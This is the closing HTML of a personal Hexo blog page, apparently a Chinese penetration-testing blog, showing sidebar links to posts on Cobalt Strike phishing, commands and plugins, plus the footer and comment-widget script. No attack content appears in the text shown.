src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CS邮件钓鱼攻击"/></a><div class="content"><a class="title" href="/%E6%B8%97%E9%80%8F/CS/%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC/CS%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6%E6%94%BB%E5%87%BB/" title="CS邮件钓鱼攻击">CS邮件钓鱼攻击</a><time datetime="2023-04-10T10:28:42.091Z" title="发表于 2023-04-10 18:28:42">2023-04-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E6%B8%97%E9%80%8F/CS/%E5%91%BD%E4%BB%A4%E7%AF%87/CS-LSTAR/" title="CS-命令篇"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CS-命令篇"/></a><div class="content"><a class="title" href="/%E6%B8%97%E9%80%8F/CS/%E5%91%BD%E4%BB%A4%E7%AF%87/CS-LSTAR/" title="CS-命令篇">CS-命令篇</a><time datetime="2023-04-10T10:28:42.090Z" title="发表于 2023-04-10 18:28:42">2023-04-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E6%B8%97%E9%80%8F/CS/%E6%8F%92%E4%BB%B6%E7%AF%87/%E5%85%8D%E6%9D%800x002-%E6%8F%92%E4%BB%B6%E7%AF%87/" title="CS-插件篇"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CS-插件篇"/></a><div class="content"><a class="title" href="/%E6%B8%97%E9%80%8F/CS/%E6%8F%92%E4%BB%B6%E7%AF%87/%E5%85%8D%E6%9D%800x002-%E6%8F%92%E4%BB%B6%E7%AF%87/" title="CS-插件篇">CS-插件篇</a><time datetime="2023-04-10T10:28:42.089Z" title="发表于 2023-04-10 18:28:42">2023-04-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Jinmu</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '',
      appKey: '',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>